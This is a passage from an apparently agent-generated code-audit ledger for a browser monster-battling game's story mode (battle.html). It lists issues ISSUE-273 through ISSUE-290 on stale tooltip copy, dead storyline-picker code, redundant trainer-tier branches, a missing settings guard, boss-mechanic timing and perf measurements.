**Blast radius**: Tier-1 #4 — clean. No refire on save/load.

**Fix sketch**: None — positive confirmation.

**Verification**: Reload during the tutorial catch screen; confirm tutorial re-presents (flag not yet set) and does not double-fire after the catch lands.

---

## <a id="ISSUE-273"></a> ISSUE-273: Post-HoF orientation tip frames the Mystery Figure as un-fought, but the row-67 climax already unmasked it

---
id: ISSUE-273
severity: P3
category: inconsistency
anchor_symbol: _showOrientationTipThenCity
current_line_hint: ~53520
file: battle.html
agents: [consistency-auditor, story-mode-investigator]
fingerprint: 8bf7bfeb549b
confidence: high
status: open
---

**Title**: Post-HoF orientation tip frames the Mystery Figure as un-fought, but the row-67 climax already unmasked it

**Evidence**:
```js
// _showOrientationTipThenCity, fired AFTER the row-67 Mystery Figure climax resolves:
'🚪 The Mystery Figure — the Crucible\'s Mystery button summons one final masked
 challenger. The mask doesn\'t come off until you win.'
// But postHofMysteryClimaxDone gating (~53483) runs the Mystery Figure fight to
// completion BEFORE this tip shows; the Crucible button tooltip (~48112) correctly
// calls it "Replay the post-HoF masked trainer".
```

**Repro**: Reach Hall of Fame, beat the row-67 Mystery Figure climax, then read the post-HoF orientation tip (`_storyShowOneTimeTip('postHof', ...)`). The tip says the mask "doesn't come off until you win" though the player has already won and seen the reveal.

**Blast radius**: Copy only — no mechanics. But it contradicts the Crucible Mystery tooltip ("Replay…") and the Crucible enter-tip ("Replay the post-HoF masked trainer"), which correctly frame the button as a rematch. The inconsistency is between three strings describing the same button.

**Fix sketch**: Reword the orientation-tip Mystery line to match the rematch framing, e.g. "The Mystery Figure — the masked challenger you just unmasked returns on demand from the Crucible's Mystery button, as tough as ever." User owns story copy (pasteur) — propose wording, do not edit.

**Verification**: Grep the three Mystery-Figure button descriptions (orientation tip ~53520, Crucible enter-tip ~48074, Crucible button tooltip ~48112) and confirm all three describe a rematch, not a first encounter.

---

## <a id="ISSUE-274"></a> ISSUE-274: CORRECTION to prior audit: storyline variant is rolled randomly every run, NOT forced to 'classic'

---
id: ISSUE-274
severity: P3
category: dx
anchor_symbol: _storyActiveVariant
current_line_hint: ~41086
file: battle.html
agents: [story-mode-investigator]
fingerprint: 58d14e311a0e
confidence: high
status: open
---

**Title**: CORRECTION to prior audit: storyline variant is rolled randomly every run, NOT forced to 'classic'

**Evidence**:
```js
// startNewRun (the LIVE path @ ~39414): storyLine: _readStorylineFromUI()
// _readStorylineFromUI: _tcState.storyline is hard-set to 'surprise_me' (@38773); the picker grid
//   _tcRenderStorylineGrid is never called → always the surprise_me branch → _pickRandomStorylineVariant()
// _pickRandomStorylineVariant: returns a uniform pick of the 8 tier!=='random' variants.
// (sm.storyLine='classic' @35258 is ONLY the v17 migration default for OLD saves.)
```

**Repro**: New run; `sm.storyLine` resolves to a random one of {classic, second_sun, bone_keepers, project_mewtwo, hypnos_lullaby, dead_raticate, lavender_frequency, static}. The spec-drift partial (`spec-drift-auditor-...214256Z`, fingerprint e9e4c9139950) states "`sm.storyLine` is forced 'classic' (battle.html:35258)" — that line is the migration default, not the new-run path; the assertion is incorrect for fresh runs.

**Blast radius**: Re-prioritizes several findings. ALL 8 variant prose layers (intro cold-opens, gym cold-opens, champion outros, mystery outros, variant rival quotes, variant gym victory cards) are LIVE and player-facing in ~7/8 of runs — so the "dead variant prose pointing at the cut Caged-God arc" issues are high-frequency live bugs, not dead-code cleanup. The player cannot choose the variant (no picker UI — ledger ISSUE-241), so it is a hidden per-run roll.

**Fix sketch**: No code fix here — this corrects the analysis baseline. Either surface the picker (re-wire `_tcRenderStorylineGrid`) so the random roll is intentional/visible, OR document that variants are an invisible per-run flavor roll. Critically: treat variant prose as LIVE when scrubbing Caged-God references.

**Verification**: Confirm via boot that `sm.storyLine` after a fresh run is frequently non-classic; downstream Caged-God-residue findings are scoped as live.

---

## <a id="ISSUE-275"></a> ISSUE-275: faintPhase counts the active foe as "fainted" mid-tick if it is at 0 HP before the swap

---
id: ISSUE-275
severity: P3
category: bug
anchor_symbol: _storyBossMechanicsTurnTick
current_line_hint: ~42065
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 9d2a9248db19
confidence: medium
status: open
---

**Title**: faintPhase counts the active foe as "fainted" mid-tick if it is at 0 HP before the swap

**Evidence**:
```js
const fainted = Array.isArray(stateRef.foeParty)
    ? stateRef.foeParty.filter(x => x && (x.currentHp | 0) <= 0).length : 0;
if (fainted >= need) { ... } // counts state.fActive too when it's at 0 HP pre-replacement
```

**Repro**: `node scripts/debug/_repro/boss-edge.mjs` (EDGE 2). The count is a raw `currentHp<=0` filter over `foeParty`; it includes the active mon. Turn-tick runs at top-of-turn (`playTurn`, ~20932) and the foe-replacement loop runs later in `checkFaints` (~25232). If a tick observes `state.fActive.currentHp<=0` before the swap, the dying active mon is tallied, so `afterFaints:2` can fire after only 1 benched KO + the active's death. Whether this mis-times by a turn depends on tick-vs-swap ordering for simultaneous KOs and replacement-then-tick sequencing.

**Blast radius**: faintPhase escalation timing on all villain bosses. Effect is a phase firing ~1 KO early in edge sequences (double-KO turns, hazard chain-KOs at ~25232). Not game-breaking (it only shifts a telegraph) but contradicts the "every 2 KOs" design intent.

**Fix sketch**: Count only *benched* faints relative to the active: `foeParty.filter(x => x !== stateRef.fActive && x.currentHp<=0).length + (alreadyReplacedCount)`, or snapshot the faint count at the moment of replacement rather than re-deriving it each tick from live HP.

**Verification**: Force a double-KO turn in a faintPhase fight; the escalation should fire on the intended Nth distinct KO, not earlier.

---

## <a id="ISSUE-276"></a> ISSUE-276: bossMechanicsTurnTick per-turn cost is ~1.5us (foeParty.filter is NOT wasteful); only _showBossBanner DOM is non-trivial and fires ~5x/battle

---
id: ISSUE-276
severity: P3
category: perf
anchor_symbol: _storyBossMechanicsTurnTick
current_line_hint: ~42021
file: battle.html
agents: [performance-profiler]
fingerprint: 9caf520a63bf
confidence: high
status: open
---

**Title**: bossMechanicsTurnTick per-turn cost is ~1.5us (foeParty.filter is NOT wasteful); only _showBossBanner DOM is non-trivial and fires ~5x/battle

**Evidence**:
```js
// faintPhase branch: the foeParty.filter only runs for UN-fired phases — once fired,
// the _bossMechanicsFired[firedKey] guard `continue`s BEFORE the filter.
const firedKey = 'faint_' + need;
if (stateRef._bossMechanicsFired && stateRef._bossMechanicsFired[firedKey]) continue; // short-circuit
const fainted = Array.isArray(stateRef.foeParty)
    ? stateRef.foeParty.filter(x => x && (x.currentHp | 0) <= 0).length : 0;          // O(party<=6)
```

**Repro**: `node /tmp/perf-ext.mjs` + `/tmp/perf-iso.mjs`. Measured (villain.magma.boss = fieldLock + 3 faintPhase, worst-case foe team):
- Steady-state per turn (phases fired, guard short-circuits): **0.0003ms (3 runs)**.
- Pure logic+filter, banner DOM disabled, all phases un-fired: **0.0015ms**.
- Isolated `foeParty.filter` at party size 6: **0.0001ms** (24: 0.0003ms; 100: 0.001ms).
- Worst-case WITH `_showBossBanner` firing every tick: **0.90-0.95ms** — but `_showBossBanner` does `document.createElement` + `appendChild` and only fires on an actual phase transition (~4-5 times across an entire boss battle), NOT every turn.

**Blast radius**: Boss battles only (villain Road-7 bosses, extra-track raids, Mystery Figure). Direct answer to the review question: walking `state._bossMechanics` + the `foeParty.filter` every tick is effectively free (single-digit microseconds at party<=6); the filter is well-guarded and not wasteful.

**Fix sketch**: No required change. Micro-nit only: `_storyBossMechanicsBattleInit` could precompute `state._bossFaintPhasesPending` so the steady-state walk skips already-fired entries entirely, but the win is sub-microsecond and not worth the added state. Leave as-is.

**Verification**: bench already confirms <2us/turn; no regression risk.

---

## <a id="ISSUE-277"></a> ISSUE-277: Redundant tier branches in `_storyBuildTierForEvent` (dead duplicate conditions)

---
id: ISSUE-277
severity: P3
category: refactor
anchor_symbol: _storyBuildTierForEvent
current_line_hint: ~37087
file: battle.html
agents: [consistency-auditor]
fingerprint: c5bc08173c0c
confidence: medium
status: open
---

**Title**: Redundant tier branches in `_storyBuildTierForEvent` (dead duplicate conditions)

**Evidence**:
```js
// Rival branch (~37087): both arms return COMPETENT — first test is dead.
if (b >= 7) return STORY_BUILD_TIER.COMPETENT;  // Stage 3 — T3, T4 via b>=8 above
if (b >= 5) return STORY_BUILD_TIER.COMPETENT;
// Basic Trainer branch (~37104): both arms return NOVICE — first test is dead.
if (b >= 5) return STORY_BUILD_TIER.NOVICE;
if (b >= 2) return STORY_BUILD_TIER.NOVICE;
```

**Repro**: Read the Rival and Basic-Trainer arms — consecutive `if` guards return the same tier, so the first guard never changes the outcome.

**Blast radius**: None behaviourally; signals an in-progress curve edit where a distinct tier was intended for one band but both ended equal. A tuner reading this can't tell if the duplication is intentional or a leftover from a half-applied change.

**Fix sketch**: Collapse each pair to one guard, OR set the intended distinct tier if the two bands were meant to differ (balance-number decision — maintainer-owned).

**Verification**: Branch logic is 1:1 after collapse; tier outputs unchanged for all (eventType, badges).

---

## <a id="ISSUE-278"></a> ISSUE-278: `_storyBuildTierForEvent` Basic-Trainer branch has a dead `b>=5` arm — route fodder jumps T2→T4 at post-game with no T3 step (half-applied curve edit)

---
id: ISSUE-278
severity: P3
category: bug
anchor_symbol: _storyBuildTierForEvent
current_line_hint: ~37106
file: battle.html
agents: [data-integrity-auditor]
fingerprint: 1cf11434af3e
confidence: high
status: open
---

**Title**: `_storyBuildTierForEvent` Basic-Trainer branch has a dead `b>=5` arm — route fodder jumps T2→T4 at post-game with no T3 step (half-applied curve edit)

**Evidence**:
```js
if (e === 'Basic Trainer') {
    if (b >= 5) return STORY_BUILD_TIER.NOVICE;   // DEAD: collapses into the next line
    if (b >= 2) return STORY_BUILD_TIER.NOVICE;
    return STORY_BUILD_TIER.UNTRAINED;
}
```

**Repro**: The `b >= 5` arm returns the same `NOVICE` (T2) as the `b >= 2` arm — it is unreachable-equivalent dead code. Net effect: Basic Trainer = UNTRAINED (b<2), NOVICE (2≤b≤7), then TOURNAMENT (b≥8, via the early `if (b >= 8) return TOURNAMENT` short-circuit at 37062). So route trainers sit at T2 from badge 2 through badge 7, then leap to T4 post-game, skipping T3 (COMPETENT) entirely. The Rival branch (37068-37069) has the identical dead `b>=7`/`b>=5` → both COMPETENT pattern.

**Blast radius**: A half-finished curve edit — the `b >= 5` arm was clearly meant to step Basic Trainer up to a higher tier at Stage 3 but was left at NOVICE. Confirms STORY_OVERHAUL_PLAN §3's "redundant tier branches (half-applied curve edit)". Low live impact (T2 still gets city-scaled IV/EV + stat band, so the foe still climbs), but it is dead/misleading code that contradicts the comment's "wild trainer < gym staff < gym leader ladder".

**Fix sketch**: Either delete the dead `b >= 5` arm (if T2-through-Stage-3 is intended) or set it to COMPETENT (if route fodder should reach T3 at Stage 3 — balance number, user-owned). Same cleanup for the Rival branch's duplicate arm.

**Verification**: Each event-type branch has strictly increasing thresholds with distinct return values; no two consecutive arms return the same tier.

---

## <a id="ISSUE-279"></a> ISSUE-279: "wild < gym staff" ladder is violated — Basic Trainer and Gym Trainer 1 share the SAME tier at every badge count

---
id: ISSUE-279
severity: P3
category: inconsistency
anchor_symbol: _storyBuildTierForEvent
current_line_hint: ~37095
file: battle.html
agents: [data-integrity-auditor]
fingerprint: 1f391dcb0522
confidence: medium
status: open
---

**Title**: "wild < gym staff" ladder is violated — Basic Trainer and Gym Trainer 1 share the SAME tier at every badge count

**Evidence**:
```js
if (e === 'Gym Trainer 1' || e === 'Gym Trainer') {  // GT1
    if (b >= 2) return STORY_BUILD_TIER.NOVICE;
    return STORY_BUILD_TIER.UNTRAINED;
}                                                     // == Basic Trainer's effective curve
```

**Repro**: Tier table by badges (replicated): Basic Trainer = [1,1,2,2,2,2,2,2,4], Gym Trainer 1 = [1,1,2,2,2,2,2,2,4] — identical at every badge. The comment at 37103 promises route fodder "one tier below the gym trainer of the same stage", and 37096 says GT1 should make "a gym's front-room staff read as weaker than the back-room (GT2)". GT2 (T3 at b≥5) is correctly above, but GT1 == Basic Trainer for the whole run, so the intended 3-rung "wild < front-room gym staff < back-room gym staff" ladder is only 2 rungs.

**Blast radius**: Cosmetic/identity (build-tier sets EV-cap/item/ability polish in the Frontier path; in story the city curve dominates so the felt gap is small). But it contradicts the design comment and the maintainer's "regular trainers slightly below the player" intent where front-room gym staff are meant to read as a notch above route fodder. Pairs with the dead-branch finding above (same function).

**Fix sketch**: If GT1 should sit above Basic Trainer, give Basic Trainer a lower ceiling (e.g. cap at UNTRAINED longer) or GT1 a higher one — balance numbers, user-owned. Otherwise update the misleading comments to state GT1 == Basic Trainer by design and only GT2 is elevated.

**Verification**: For every badge count, `tier('Basic Trainer') <= tier('Gym Trainer 1') <= tier('Gym Trainer 2')` with at least one strict step, matching the comment.

---

## <a id="ISSUE-280"></a> ISSUE-280: Basic Trainer build-tier ladder collapses at Stage 2 — same tier as Gym Trainers despite the "one tier below" comment

---
id: ISSUE-280
severity: P3
category: balance
anchor_symbol: _storyBuildTierForEvent
current_line_hint: ~33847
file: battle.html
agents: [story-mode-investigator]
fingerprint: 8909d73d953d
confidence: high
status: open
---

**Title**: Basic Trainer build-tier ladder collapses at Stage 2 — same tier as Gym Trainers despite the "one tier below" comment

**Evidence**:
```js
if (e === 'Basic Trainer') {
    // Route fodder sits one tier below the gym trainer of the same stage...
    if (b >= 5) return STORY_BUILD_TIER.NOVICE;   // GymTrainer here = COMPETENT → OK (one below)
    if (b >= 2) return STORY_BUILD_TIER.NOVICE;   // GymTrainer here = NOVICE   → EQUAL, not one below
    return STORY_BUILD_TIER.UNTRAINED;
}
```

**Repro**: At Stage 2 (badges 2–4), `_storyBuildTierForEvent('Gym Trainer 1', _, 2)` = NOVICE (T2) and `_storyBuildTierForEvent('Basic Trainer', _, 2)` = NOVICE (T2) — identical. The function's own comment promises a "wild trainer < gym staff < gym leader" ladder per stage, which holds at Stage 3 (Basic T2 < GymTrainer T3) but breaks at Stage 2 where both are T2. The two redundant Basic branches (`b>=5` and `b>=2` both NOVICE) suggest the `b>=2` line was meant to return UNTRAINED (one below the Stage-2 gym trainer's NOVICE).

**Blast radius**: Build-power curve for route/Basic trainers across the badges-2..4 mid-early game. Basic Trainers feel as tuned as gym staff in that window, flattening the intended difficulty texture. Purely a build-quality (EVs/nature/item) delta, not a crash.

**Fix sketch**: Change the Basic Trainer `b >= 2` branch to `return STORY_BUILD_TIER.UNTRAINED;` so the ladder is Basic(T1) < GymTrainer(T2) < Leader(T2 floor + ace) at Stage 2, matching Stage 3's relationship. Or, if the collapse is intentional, drop the redundant `b>=5` line and fix the comment.

**Verification**: `StoryMode.debugBuildTiers()` matrix — confirm Basic Trainer is strictly below Gym Trainer 1 at every badge count 2..7.

---

## <a id="ISSUE-281"></a> ISSUE-281: `_storyEnemyMechKeys` doesn't guard against missing `sm.settings` — could throw on a malformed save

---
id: ISSUE-281
severity: P3
category: dx
anchor_symbol: _storyEnemyMechKeys
current_line_hint: ~31328
file: battle.html
agents: [story-mode-investigator]
fingerprint: d5c6a99636ec
confidence: medium
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `_storyEnemyMechKeys` doesn't guard against missing `sm.settings` — could throw on a malformed save

**Evidence**:
```js
// battle.html ~31328
function _storyEnemyMechKeys() {
    const k = [];
    const unlocked = new Set(Array.isArray(sm.unlockedGimmicks) ? sm.unlockedGimmicks : []);
    if (sm.settings.dynaOn && unlocked.has('dmax')) k.push('gmax');    // ← throws if sm.settings undefined
    if (sm.settings.megaOn && unlocked.has('mega')) k.push('mega');
    ...
}
```
A corrupted save (deleted `sm.settings`, partial load) would throw `TypeError: Cannot read property 'dynaOn' of undefined`. The function is called from inside `_applyEnemyGimmickDistribution` → `rollTrainerTeam` — every battle entry. The `try/catch` at startBattle (`forEach` wrap at line 15319) catches the throw but the foe team won't have mechanics.

**Repro**: Construct a save with `version: SAVE_VER` but no `settings` key, load it. `_storyEnemyMechKeys()` throws.

**Blast radius**: Low — the load() function already enforces `sm.settings` exists (lines 30903-30917 add defaults). The throw is theoretically reachable via direct console mutation. Defensive coding only.

**Fix sketch**: Add the standard pre-guard:
```js
function _storyEnemyMechKeys() {
    const k = [];
    if (!sm || !sm.settings) return k;
    const unlocked = new Set(Array.isArray(sm.unlockedGimmicks) ? sm.unlockedGimmicks : []);
    ...
}
```

**Verification**: After fix, calling `_storyEnemyMechKeys()` with `sm = {}` returns `[]` instead of throwing.

---

## <a id="ISSUE-282"></a> ISSUE-282: Mystery Figure sprite is now `Red` (the_first); the `'Cyrus'` fallback at enterBattleEvent is dead

---
id: ISSUE-282
severity: P3
category: inconsistency
anchor_symbol: _storyEnsureMysteryIdentity
current_line_hint: ~33120
file: battle.html
agents: [story-mode-investigator]
fingerprint: d042b79a10dc
confidence: high
status: open
---

**Title**: Mystery Figure sprite is now `Red` (the_first); the `'Cyrus'` fallback at enterBattleEvent is dead

**Evidence**:
```js
const MYSTERY_FIGURE_IDENTITIES = { the_first: { sprite: 'Red', reveal: 'The First', … } };
function _storyEnsureMysteryIdentity(){ sm.mysteryIdentity='the_first'; return MYSTERY_FIGURE_IDENTITIES.the_first; }
// enterBattleEvent: spriteFile: (_mysteryFinalFace && _mysteryFinalFace.sprite) || 'Cyrus',
//   _mysteryFinalFace is always the_first (sprite 'Red'), so the '|| Cyrus' arm never executes.
```

**Repro**: Reach the post-HoF Mystery Figure (row 67). Sprite is `Red`, not `Cyrus`. The prior audit item "Mystery Figure sprite was unconditionally `Cyrus`" is resolved — it is now unconditionally `Red`. The `'Cyrus'` literal fallback is unreachable dead code.

**Blast radius**: Cosmetic / dead-code only. Worth noting so the prior audit item is closed and the dead fallback removed.

**Fix sketch**: Drop the `|| 'Cyrus'` fallback (the_first always supplies a sprite) or keep as defensive default but update the stale prior-audit note.

**Verification**: Mystery Figure renders the Red sprite; grep shows no live dependence on the `'Cyrus'` fallback.

---

## <a id="ISSUE-283"></a> ISSUE-283: Stale comment on `_storyGrantTrackEndReward` — claims scene-queue piggy-back that is structurally impossible

---
id: ISSUE-283
severity: P3
category: dx
anchor_symbol: _storyGrantTrackEndReward
current_line_hint: ~42120
file: battle.html
agents: [story-mode-investigator]
fingerprint: 2ed72d9b81f5
confidence: high
status: open
---

**Title**: Stale comment on `_storyGrantTrackEndReward` — claims scene-queue piggy-back that is structurally impossible

**Evidence**:
```js
// Called from the beat-fired hook (currently piggy-backs on _playStoryBeatQueue's mark
// step; will fire from PR-5b's battle-injection victory hook once it lands)...
```
But `_playStoryBeatQueue` is fed only by `_resolveActiveRoadBeats`, whose `eligible()` predicate is `slot.kind === 'event'` (`~41913`). A `villain.*.boss` (`kind:'boss'`) / `extra.*.raid` (`kind:'raid'`) can NEVER enter that queue.

**Repro**: jsdom — `T.resolveActiveRoadBeats(road)` across all roads returns only `kind:"event"` beats (`roadBeatKinds:["event"]`). The boss/raid reward path runs solely from the onBattleEnd hook (`~47572`).

**Blast radius**: Documentation only. The comment misdescribes which path delivers the flagship rewards; it implies the scene-queue path is a live reward site (it is a no-op there). Misleads the next maintainer auditing for double-grant (the real single source of truth is the battle-victory hook).

**Fix sketch**: Rewrite the header comment: the reward fires ONLY from the battle-injection victory hook (`onBattleEnd`, `~47572`); the `_playStoryBeatQueue` call (`~42012`) is a guaranteed no-op for these regexes because the queue is event-kind-only.

**Verification**: comment matches the resolved call graph; no behavior change.

---

## <a id="ISSUE-284"></a> ISSUE-284: Extra-track raid EXP-Share reward + boss BOSS_MECHANICS are partly data-only — engine wiring deferred (mechanics are no-ops that only record)

---
id: ISSUE-284
severity: P3
category: dx
anchor_symbol: _storyGrantTrackEndReward
current_line_hint: ~42546
file: battle.html
agents: [story-mode-investigator]
fingerprint: d683843c4c03
confidence: medium
status: open
---

**Title**: Extra-track raid EXP-Share reward + boss BOSS_MECHANICS are partly data-only — engine wiring deferred (mechanics are no-ops that only record)

**Evidence**:
```js
// BOSS_MECHANICS: "each mechanic is a no-op that records its activation —
//   the data is authoritative + ready to consume" (engine hooks "live in a polish PR").
// _storyGrantTrackEndReward extra raid: grants sm.inventory.expShareVoucher;
//   "the full grateful-NPC delivery scene is pasteur's to author (B33)".
```

**Repro**: `BOSS_CONFIGS`/`BOSS_MECHANICS` push entries onto `battle._mechanics` but the turn-loop hooks that consume them are stubbed (`_storyBossMechanicsTurnTick` exists but the activation is record-only). The villain/extra boss "phases" (surge/immunity/heal banners) are largely cosmetic until the polish PR lands.

**Blast radius**: The 3-track villain/extra bosses advertise escalating FAINT-count / HP-threshold phases (per BOSS_CONFIGS prose) but the mechanical effect is incomplete — players may see banners ("NO WITNESSES", "PRIMAL HEAT") without the corresponding stat/field change firing. This is in-scope story content (not Crucible/Frontier).

**Fix sketch**: Track which BOSS_CONFIGS effects are live vs telegraph-only; either finish the turn-loop wiring or downgrade the prose so banners that don't yet do anything aren't shown as mechanics.

**Verification**: A villain-boss fight at the faint thresholds shows the advertised stat/field effect, not just the banner.

---

## <a id="ISSUE-285"></a> ISSUE-285: CONFIRMED CLEAN — party-cap curve = min(6, 2+badges) with no off-by-one; foe sizing matches

---
id: ISSUE-285
severity: P3
category: bug
anchor_symbol: _storyMaxPartySize
current_line_hint: ~41170
file: battle.html
agents: [story-mode-investigator]
fingerprint: 306eabc530b8
confidence: high
status: open
---

**Title**: CONFIRMED CLEAN — party-cap curve = min(6, 2+badges) with no off-by-one; foe sizing matches

**Evidence**:
```js
function _storyMaxPartySize() {
    const badges = (sm && sm.badges) | 0;
    return Math.max(2, Math.min(6, 2 + badges));   // 41172
}
// Foe size (41137): finales=6; intro rival=playerTeamLen; else max(roleFloor, 2+badges)
```

**Repro**: `_storyMaxPartySize` (41170) returns `max(2, min(6, 2+badges))`, used consistently at catch (44933), Professor (40707), daycare (39683), and the cap-teach overlay (42650). Foe sizing `_storyEnemyPartySize` (41137) mirrors it with finale=6 + intro-rival player-match special cases + a role-floor safety net. No off-by-one at catch time or Professor-offer time.

**Blast radius**: Tier-1 #3 — clean.

**Fix sketch**: None — positive confirmation.

**Verification**: badges 0→4 yields cap 2,3,4,5,6; intro rival is 1v1; finales always 6.

---

## <a id="ISSUE-286"></a> ISSUE-286: Legacy storyline picker is dead UI — hidden DOM + uncalled renderer + unreachable card handlers, superseded by sm.tracks

---
id: ISSUE-286
severity: P3
category: refactor
anchor_symbol: _tcRenderStorylineGrid
current_line_hint: ~38893
file: battle.html
agents: [consistency-auditor]
fingerprint: c4298b3df1c1
confidence: high
status: open
---

**Title**: Legacy storyline picker is dead UI — hidden DOM + uncalled renderer + unreachable card handlers, superseded by sm.tracks

**Evidence**:
```js
function _tcRenderStorylineGrid() {            // ~38893 — ZERO callers
  const grid = document.getElementById('story-create-storyline-grid');
  if (!grid) return; ...
}
// DOM: <section id="story-create-storyline-section" style="display:none;">  ~9549
// <h2>Storyline (legacy)</h2>  ~9550
```

**Repro**: `grep -nE '_tcRenderStorylineGrid' battle.html` → definition only, never called, so the hidden `#story-create-storyline-grid` is never populated. Therefore `trainerCreateSetStoryline` (only reachable via the never-rendered card `onclick`s) and `_tcSyncStorylineCards` (iterates 0 cards) are effectively unreachable too. The legacy `<select id="story-setting-storyline">` fallback in `_readStorylineFromUI` (~41209) references an element that does not exist in the DOM. NOTE (not a race): `_tcState.storyline` IS still consumed — `startNewRun` reads it via `_readStorylineFromUI()` at ~39517 — but it is force-set to the `'surprise_me'` sentinel at ~38824 and never changed (grid is dead), so every run deterministically rolls a random variant. That matches the documented v22 intent; there is no old+new both-fire path.

**Blast radius**: Run-setup UI only; out-of-scope PvP/Quick Play untouched. The `_tcState.storyline` shim itself is load-bearing (drives `_readStorylineFromUI`) and must stay until the surprise_me roll is re-sourced; only the picker UI is dead.

**Fix sketch**: Delete the `#story-create-storyline-section` block (~9549-9554), the unused `_tcRenderStorylineGrid`, `_tcSyncStorylineCards`, `trainerCreateSetStoryline` (+ its `window.StoryMode` export), the dead `.story-create-storyline-*` CSS (~2485-2515), and the dead `#story-setting-storyline` fallback branch in `_readStorylineFromUI`. Keep `_tcState.storyline`/`_readStorylineFromUI`/`_pickRandomStorylineVariant` (the live random-roll path). Verify nothing reads `_tcState.storyline` other than `_readStorylineFromUI` before cutting.

**Verification**: `grep -nE '_tcRenderStorylineGrid|trainerCreateSetStoryline|story-create-storyline' battle.html` returns 0 hits; new-run flow still rolls a storyline variant (story-playthrough harness boots and `sm.storyLine` is a valid variant id).

---

## <a id="ISSUE-287"></a> ISSUE-287: `_validateTrainerData` logs a success `console.log` on every boot (ungated)

---
id: ISSUE-287
severity: P3
category: dx
anchor_symbol: _validateTrainerData
current_line_hint: ~37354
file: battle.html
agents: [consistency-auditor]
fingerprint: 70517df8e82b
confidence: high
status: open
---

**Title**: `_validateTrainerData` logs a success `console.log` on every boot (ungated)

**Evidence**:
```js
// _validateTrainerData() is called unconditionally at boot (~10446):
if (errs.length) console.warn(`[TRAINER_DATA] ${errs.length} hard error(s) — ...`);
else console.log('[TRAINER_DATA] validation: all signatures resolve to known species.');
```

**Repro**: Load `battle.html` in a browser; the console prints "[TRAINER_DATA] validation: all signatures resolve to known species." on every page load (and `console.info` lines for each soft issue at ~37355).

**Blast radius**: Shipped console noise only. Unlike the `__DEBUG_LOADS`/`__DEBUG_SPRITE_SCALE`-gated logs elsewhere in `loadGameData`, this success path is ungated. The `[SpriteScale]` and `[Data]`/`[CSV]`/`[Smogon]` logs are correctly gated; this one is the outlier.

**Fix sketch**: Gate the success `console.log` (and the per-issue `console.info` loop) behind `window.__DEBUG_LOADS`, matching the sibling load logs. Keep the `console.warn` hard-error path ungated.

**Verification**: Boot without debug flags → no `[TRAINER_DATA] validation:` line. Boot with `?...` debug flag → line present.

---

## <a id="ISSUE-288"></a> ISSUE-288: Variant rival quote pools are uneven — several phases have a single line; many phases absent

---
id: ISSUE-288
severity: P3
category: refactor
anchor_symbol: _VARIANT_RIVAL_QUOTES
current_line_hint: ~37458
file: battle.html
agents: [consistency-auditor]
fingerprint: 156f9f10653f
confidence: medium
status: open
---

**Title**: Variant rival quote pools are uneven — several phases have a single line; many phases absent

**Evidence**:
```js
// 37458 — _VARIANT_RIVAL_QUOTES: phase-keyed (0=intro … 4=league). Single-line phases:
bone_keepers:   { 0:[1 line], 2:[1 line], 4:[1 line] },   // no phase 1, 3
project_mewtwo: { 0:[1 line], 2:[1 line], 4:[1 line] },   // no phase 1, 3
lavender_frequency:{ 0:[1 line], 3:[1 line], 4:[1 line] },// no phase 1, 2
```

**Repro**: `getTrainerQuoteForBattle` draws the variant rival line at 50% when a pool exists for the phase; a single-line phase always returns that one line on every variant rival encounter in that phase. The base TRAINER_QUOTES['Rival'] (10 lines) + standing pools still cover the other 50%, so this is not a hard "repeats instantly" bug — but within the variant voice it is one-line-deep, and the comment ("Sparse on purpose") confirms intent.

**Blast radius**: Voice-depth consistency only. The pasta variants are the texture the design charter (REDESIGN_PLAN §1, "creepypasta/leaker texture") leans on; one-line phases thin that texture on repeat rival fights. Lower priority than the base pools, which are deep (TRAINER_QUOTES_BY_NAME, LEADER_VICTORY_LINES, etc. are all ≥2-3 lines and exhaustive across every Gym Leader / E4 / Champion).

**Fix sketch**: Optional — bring the thin variant phases (bone_keepers, project_mewtwo, lavender_frequency) to ≥2 lines each, or accept the sparseness and leave a one-line note that the base Rival pool is the depth backstop. No code change needed; data-only.

**Verification**: Each populated variant phase has ≥2 lines, or a comment documents the single-line-by-design decision.

---

## <a id="ISSUE-289"></a> ISSUE-289: Wild grade keyed on CITY (STORY_WILD_GRADE_BY_CITY), not badges — spec §3/§15f say _WILD_GRADE_CURVE_BY_BADGES (which does not exist)

---
id: ISSUE-289
severity: P3
category: inconsistency
anchor_symbol: _wildGradeWeightsForCity
current_line_hint: ~50174
file: battle.html
agents: [story-mode-investigator]
fingerprint: 6fa4b2cf1847
confidence: high
status: open
---

**Title**: Wild grade keyed on CITY (STORY_WILD_GRADE_BY_CITY), not badges — spec §3/§15f say _WILD_GRADE_CURVE_BY_BADGES (which does not exist)

**Evidence**:
```js
const STORY_WILD_GRADE_BY_CITY = [ ... ];        // @50164
function _wildGradeWeightsForCity(city) { ... }   // @50174
// grep _WILD_GRADE_CURVE_BY_BADGES -> 0 hits in code (only in the doc)
```

**Repro**: Harness `wildGradeWeightsForCity(0..8)` ⇒ city0/1/2 pure g4, ramping to g2 leak at city6+. The function takes a **city index**, not badges.

**Blast radius**: STORY_MODE_FLOW §3 ("badge-keyed wild grade curve `_WILD_GRADE_CURVE_BY_BADGES`") and §15f (lists a per-badge G2-leak ramp) both name a badges-keyed symbol that doesn't exist. City and badges are near-1:1 in the main timeline, so the live behavior is close to intended — but the spec's named anchor is wrong and the keying axis differs (a player who deposits to PC / loses no badges still advances wild grade by city). Confirms ISSUE-105/ISSUE-223.

**Fix sketch**: Either rename the doc references to `STORY_WILD_GRADE_BY_CITY`/`_wildGradeWeightsForCity` and the "city-keyed" axis, or (if badges is the intended invariant per §12's "drop sm.team.length, use sm.badges") re-key the function on `sm.badges`. Maintainer owns the axis choice.

**Verification**: Doc anchor resolves via `symbol-index --lookup`; keying axis matches §12 intent.

---

## <a id="ISSUE-290"></a> ISSUE-290: CONFIRMED CLEAN — mechanics unlock gate has no leak on any player or enemy path

---
id: ISSUE-290
severity: P3
category: bug
anchor_symbol: _withStoryPlayerGimmickGate
current_line_hint: ~11419
file: battle.html
agents: [story-mode-investigator]
fingerprint: fc7eab00919a
confidence: high
status: open
---

**Title**: CONFIRMED CLEAN — mechanics unlock gate has no leak on any player or enemy path

**Evidence**:
```js
// Player paths all wrap makeBuild with the gate:
//   37975 evolution/swap, 40794 Professor, 43721 boss arc (_bossArcRollLegendary),
//   44295 makeWildBuild, 47484 evolution, 37975 roamingLegendary prepare
build = _withStoryPlayerGimmickGate(() => makeBuild(name));
// Enemy side: _storyEnemyMechKeys filters by sm.unlockedGimmicks (32848)
if (S.megaOn && unlocked.has('mega')) k.push('mega');  // etc.
```

